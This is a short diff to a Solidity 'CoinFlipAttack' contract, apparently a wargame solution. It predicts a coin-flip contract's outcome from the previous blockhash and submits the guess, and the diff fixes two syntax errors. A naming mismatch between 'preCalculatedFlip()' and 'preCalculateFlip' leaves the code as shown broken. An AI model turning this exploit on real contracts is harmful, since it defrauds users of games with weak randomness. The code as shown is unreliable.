@@ -45,11 +45,11 @@ contract CoinFlipAttack {
     }
 
     function preCalculateFlip() private returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number() - 1));
+        uint256 blockValue = uint256(blockhash(block.number - 1));
         return ( blockValue / FACTOR ) == 1 ? true : false;
     }
 
-    function attackCoinFlip() public returns (void){
+    function attackCoinFlip() public {
         preCalculatedFlip = preCalculatedFlip();
         coinFlip.flip(preCalculatedFlip);
     }
